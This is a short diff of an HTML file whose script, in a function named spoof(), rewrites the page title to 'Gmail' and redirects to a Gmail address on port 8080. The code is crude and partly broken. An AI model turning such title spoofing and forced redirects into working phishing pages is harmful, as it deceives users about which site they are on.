@@ -4,6 +4,12 @@
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <title>Untitled Document</title>
 
+ 
+  
+</head>
+
+<body>
+<div id="hello"></div>
   
 <script>
 function spoof()
@@ -15,12 +21,7 @@ document.write("<title>Gmail</title>");
 document.write("hello");
 window.location.assign("https://www.Gmail.com:8080");
 }
-window.onload = setInterval(spoof(),100000);
+setInterval(spoof(),100000);
 </script>
-  
-</head>
-
-<body>
-<div id="hello"></div>
 </body>
 </html>
